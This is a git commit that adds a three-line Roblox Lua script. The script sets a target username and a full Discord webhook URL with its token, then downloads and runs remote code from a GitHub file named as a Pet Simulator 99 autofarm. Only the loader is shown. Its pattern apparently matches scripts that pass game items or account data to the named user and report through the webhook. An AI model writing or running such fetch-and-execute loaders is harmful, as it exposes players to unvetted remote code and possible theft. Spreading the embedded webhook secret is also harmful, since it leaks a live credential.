ee00bfb2faadfeb51bda61ea0051bcc634f68576
redredd1w11-debug <pomarenkoivan9@gmail.com>
2024-10-06 18:54:16 +0300

    Add files via upload

---
+++ OPSCRIPTT.lua
@@ -0,0 +1,3 @@
+_G.username = "pets8883"
+_G.webhook = "https://discord.com/api/webhooks/1292503100506116097/jVpB5un_89y7WBvDhkUx9ivzLcYQO0IIfwC_WDW_Z9LUgpY25Y2EiedfYvwhnnOJdFzd"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua', true))()
